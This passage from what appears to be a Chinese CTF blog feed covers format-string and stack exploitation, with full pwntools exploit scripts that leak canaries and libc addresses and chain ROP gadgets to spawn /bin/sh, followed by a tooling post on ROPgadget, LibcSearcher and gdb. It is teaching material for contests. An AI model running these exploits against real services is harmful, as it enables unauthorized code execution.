href="#覆盖栈上任意地址" class="headerlink" title="覆盖栈上任意地址"></a>覆盖栈上任意地址</h4><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p>尝试将 <code>arg2</code> 的值更改为任意值 （ 比如 <code>0x00000020</code> ，十进制 32 ）在gdb中可以看到得到<code>arg2</code>的地址<code>0xffffd538</code>， 那么我们构造格式字符串<code>\x38\xd5\xff\xff%08x%08x%012d%13$n</code> ， 且中 <code>\x38\xd5\xff\xff</code> 表示 <code>arg2</code> 的地址，占 4 字节，<code>％08x％08X</code> 表示两个 8 字符宽的十六进制数 ， 占 16 字节 ，<code>％012d</code> 占 12 字节 ， 三个部分加起来就占了4 + 16 + 12 &#x3D; 32 字节 ， 即把 arg2 赋值为 <code>0x00000020</code>。 格式字符串最后一部分<code>％13$n</code>也是最重要的一部分，和上面的内容一样 ， 表示格式字符串的第 13 个参数 ， 即写入 <code>0xffffd538</code> 的地方（ <code>0xffffd564 </code>）<code>printf()</code> 就是通过这个地址找到被覆盖的内容的 </p><p><code>printf</code> 首先解析 <code>％13$</code> 找到获得地址<code>0xffffd564</code> 的值<code>0xffffd538</code>， 然后跳转到地址 <code>0xffffd538</code>， 将它的值 <code>0X88888888</code> 覆盖为 <code>20</code> ， 就得到<code>arg2 = 0x00000020 </code></p><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><table><thead><tr><th align="right">High address</th><th align="center"></th></tr></thead><tbody><tr><td align="right"></td><td align="center">args</td></tr><tr><td align="right"></td><td align="center">return address</td></tr><tr><td align="right">rbp</td><td align="center">old ebp</td></tr><tr><td align="right">rbp - 8</td><td align="center">canary value</td></tr><tr><td align="right"></td><td align="center">local variable</td></tr><tr><td align="right">Low address</td><td align="center"></td></tr></tbody></table><h3 id="水水实例"><a href="#水水实例" class="headerlink" title="水水实例"></a>水水实例</h3><p>某某杯payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./pwn1&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;172.51.228.233&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;thing\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;tricks\n0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recvn(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">backdoor=base-<span class="number">0x94</span></span><br><span class="line">binsh=base+<span class="number">0x202068</span>-<span class="number">0xa94</span></span><br><span class="line">gadgets=base+<span class="number">0xc73</span>-<span class="number">0xa94</span></span><br><span class="line">gadgets2=base+<span class="number">0x821</span>-<span class="number">0xa94</span></span><br><span class="line">sys=base+<span class="number">0x870</span>-<span class="number">0xa94</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvn(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">25</span>*<span class="number">8</span>+p64(canary)+<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>+p64(gadgets)+p64(binsh)+p64(gadgets2)+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h2><p>fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;’byte’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。<br>fmtstr_payload函数返回的就是payload</p><p>实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})</p><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p>读入函数不保存在栈上，无法直接修改地址的情况</p><p>通过利用栈上已有的地址，向已有的地址写入想修改的地址，然后再将修改后的地址作为参数</p><p>例：dasctf2023bin专项，fooooood（wp转载）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># 1-&gt;11 2-&gt;37</span></span><br><span class="line"><span class="comment"># 1-&gt;25 2-&gt;39</span></span><br><span class="line"><span class="comment"># 覆盖变量i为40</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>);</span><br><span class="line">payload=<span class="string">b&#x27;%11$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;like &#x27;</span>)</span><br><span class="line">rsp=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;!?&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-<span class="number">248</span></span><br><span class="line">i=rsp+<span class="number">4</span></span><br><span class="line">i_off=i&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(i_off).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">40</span>).encode()+<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#泄露libc_base</span></span><br><span class="line">payload=<span class="string">b&#x27;%9$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;like &#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;!?&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-<span class="number">240</span>-libc.sym.__libc_start_main<span class="comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述</span></span><br><span class="line">（<span class="number">1</span>）与（<span class="number">2</span>）两个栈地址在格式化字符串中的偏移</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overlap</span>(<span class="params">dest,ptr,off1,off2</span>):</span><br><span class="line">d=dest&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ptr:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(d).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off1).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">f=ptr&amp;<span class="number">0xff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(f).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off2).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">d+=<span class="number">1</span></span><br><span class="line">ptr&gt;&gt;=<span class="number">8</span></span><br><span class="line">ret=rsp+<span class="number">0x18</span></span><br><span class="line">ptr=libc.address+<span class="number">0x21112</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym.system))</span><br><span class="line"><span class="comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(<span class="number">25</span>).encode()+<span class="string">b&#x27;$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#覆盖返回地址为ptr（pop_rdi; ret）</span></span><br><span class="line">overlap(ret,ptr,<span class="number">25</span>,<span class="number">39</span>)</span><br><span class="line"><span class="comment">#覆盖返回地址+8的位置为binsh字符串地址</span></span><br><span class="line">overlap(ret+<span class="number">8</span>,libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__(),<span class="number">25</span>,<span class="number">39</span>)</span><br><span class="line"><span class="comment">#覆盖返回地址+16的位置为system函数的地址</span></span><br><span class="line">overlap(ret+<span class="number">16</span>,libc.sym.system,<span class="number">25</span>,<span class="number">39</span>)</span><br><span class="line"><span class="comment">#至此，退出循环执行ROP后即可获取系统操作权限</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述</span></span><br><span class="line">（<span class="number">1</span>）与（<span class="number">2</span>）两个栈地址在格式化字符串中的偏移</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overlap</span>(<span class="params">dest,ptr,off1,off2</span>):</span><br><span class="line">d=dest&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ptr:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(d).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off1).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">f=ptr&amp;<span class="number">0xff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(f).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off2).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">d+=<span class="number">1</span></span><br><span class="line">ptr&gt;&gt;=<span class="number">8</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（零）——工具篇</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E9%9B%B6%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E9%9B%B6%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有些人喜欢摸鱼，摸上瘾了，就什么都不记得了</p></blockquote><h4 id="连接-分析命令"><a href="#连接-分析命令" class="headerlink" title="连接&amp;分析命令"></a>连接&amp;分析命令</h4><p><code>nc</code> ：nc</p><p><code>file</code> <code>checksec</code> ：检查文件</p><h4 id="ROP工具"><a href="#ROP工具" class="headerlink" title="ROP工具"></a>ROP工具</h4><h6 id="查找可存储寄存器的代码（rop表示二进制文件名）"><a href="#查找可存储寄存器的代码（rop表示二进制文件名）" class="headerlink" title="查找可存储寄存器的代码（rop表示二进制文件名）"></a>查找可存储寄存器的代码（rop表示二进制文件名）</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span></span><br></pre></td></tr></table></figure><h6 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span></span></span><br></pre></td></tr></table></figure><h6 id="查找有int-0x80的地址"><a href="#查找有int-0x80的地址" class="headerlink" title="查找有int 0x80的地址"></a>查找有int 0x80的地址</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --only <span class="string">&#x27;int&#x27;</span></span></span><br></pre></td></tr></table></figure><h6 id="生成rop链"><a href="#生成rop链" class="headerlink" title="生成rop链"></a>生成rop链</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --ropchain</span></span><br></pre></td></tr></table></figure><h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump]</span><br><span class="line"></span><br><span class="line">    -h, --help           显示帮助文档</span><br><span class="line">    -v, --version        版本号</span><br><span class="line">    -c, --checkUpdate    检测新版本是否可用</span><br><span class="line">    --binary &lt;binary&gt;    指定二进制文件进行分析</span><br><span class="line">    --opcode &lt;opcodes&gt;   在可执行段中查找opcode</span><br><span class="line">    --string &lt;string&gt;    在可读的段中查找字符串</span><br><span class="line">    --memstr &lt;string&gt;    查找单个byte在所有的可执行段中</span><br><span class="line">    --depth &lt;nbyte&gt;      搜索引擎的深度</span><br><span class="line">    --only &lt;key&gt;         只显示特别的指令</span><br><span class="line">    --filter &lt;key&gt;       过滤特定指令</span><br><span class="line">    --range &lt;start-end&gt;  在地址之间寻找(0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt;    拒绝特定指令在gadget的地址下</span><br><span class="line">    --rawArch &lt;arch&gt;     指定文件架构</span><br><span class="line">    --rawMode &lt;mode&gt;     指定源文件的mode</span><br><span class="line">    --rawEndian &lt;endian&gt; 指定源文件的endianness</span><br><span class="line">    --re &lt;re&gt;            正则表达式</span><br><span class="line">    --offset &lt;hexaddr&gt;   指定gadget的地址偏移</span><br><span class="line">    --ropchain           ROP chain的生成</span><br><span class="line">    --thumb              在ARM架构下使用搜索引擎thumb 模式</span><br><span class="line">    --console            使用交互终端对于搜索引擎</span><br><span class="line">    --norop              禁止ROP搜索引擎</span><br><span class="line">    --nojop              禁止JOP搜索引擎</span><br><span class="line">    --callPreceded       仅显示call-preceded的gadgets</span><br><span class="line">    --nosys              禁止SYS搜索引擎</span><br><span class="line">    --multibr            允许多分枝gadgets</span><br><span class="line">    --all                禁止删除重复的gadgets，即显示所有</span><br><span class="line">    --noinstr            禁止gadget指令终端打印</span><br><span class="line">    --dump               输出gadget bytes</span><br></pre></td></tr></table></figure><h4 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h4><h4 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h4><p><code>strace</code> : trace all system call</p><p><code>ltrace</code> : trace all library call</p><h4 id="lib查找工具"><a href="#lib查找工具" class="headerlink" title="lib查找工具"></a>lib查找工具</h4><h6 id="LibSearcher"><a href="#LibSearcher" class="headerlink" title="LibSearcher"></a>LibSearcher</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"> </span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment"># sys_addr = libc_base + obj.dump(&quot;system&quot;)</span></span><br></pre></td></tr></table></figure><h6 id="在线查找"><a href="#在线查找" class="headerlink" title="在线查找"></a>在线查找</h6><p><a href="https://libc.rip/">https://libc.rip/</a></p><h4 id="Payload编写"><a href="#Payload编写" class="headerlink" title="Payload编写"></a>Payload编写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">&lt;tabTrigger&gt;pwn&lt;/tabTrigger&gt;</span><br><span class="line">&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">&lt;scope&gt;source.shell.bash&lt;/scope&gt; </span><br><span class="line">&lt;/snippet&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">send(payload) <span class="comment">#发送payload</span></span><br><span class="line">sendline(payload) <span class="comment">#发送payload，并进行换行（末尾\n）</span></span><br><span class="line">sendafter(some_string, payload) <span class="comment">#接收到 some_string 后, 发送你的 payload</span></span><br><span class="line">recvn(N) <span class="comment">#接受 N(数字) 字符</span></span><br><span class="line">recvline() <span class="comment">#接收一行输出</span></span><br><span class="line">recvlines(N) <span class="comment">#接收 N(数字) 行输出</span></span><br><span class="line">recvuntil(some_string) <span class="comment">#接收到 some_string 为止</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>),<span class="number">16</span>) <span class="comment">#接受十六进制数</span></span><br><span class="line">p64()</span><br><span class="line">p32()</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span><span class="comment">#amd64</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">flat([<span class="number">0x114514</span>,<span class="number">0x191980</span>,...])</span><br><span class="line">p32(<span class="number">0x114514</span>)+p32(<span class="number">0x191980</span>)+...</span><br><span class="line"><span class="comment">#需设置好架构</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">libc.symbols[&#x27;__libc_start_main&#x27;]5</span><br></pre></td></tr></table></figure><h4 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h4><p><code>cyclic 114</code>生成</p><p><code>cyclic -l laaa</code>检索(检索出数字为填到ret之前的数字)</p><h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><ul><li>启动：<code>start</code></li><li>断点：<ul><li><code>b *0x114514</code></li><li><code>b 符号名</code></li><li><code>d</code>删除，带数字第几个断点</li></ul></li><li>单步<ul><li>步入<code>si</code></li><li>步过<code>so</code></li><li>源码\汇编单步<code>n</code></li><li>直到下一个断点<code>c</code></li></ul></li><li>查看内存<ul><li><code>x/20gx 0x114514</code><ul><li>g：8byte，w：4byte，b：1byte</li><li>寄存器：<code>$esp</code></li></ul></li><li><code>hexdump 0x114514</code> 可查看内存及字符串</li><li><code>dsp</code> 自动解引用</li></ul></li><li>查看段的地址 范围<ul><li><code>vmmap</code></li></ul></li><li>查找地址<ul><li><code>printf system</code> 查找函数地址</li><li><code>find 0xf7df4d90,+2200000,&quot;/bin/sh&quot;</code> 起始地址+搜索长度+字符串</li></ul></li><li>info<ul><li><code>info breakpoint</code></li><li><code>info register</code></li></ul></li><li>elf</li><li>plt</li><li>fmtarg</li><li>arch使用pwndbgheap<ul><li><a href="https://gist.github.com/nbulischeck/bda4397a59b77822703f98f6aeb2cb20">https://gist.github.com/nbulischeck/bda4397a59b77822703f98f6aeb2cb20</a></li></ul></li><li>disassemble</li></ul><p>.gdbinit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/deepunk/Public/pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> /home/deepunk/Public/Pwngdb/pwngdb.py</span><br><span 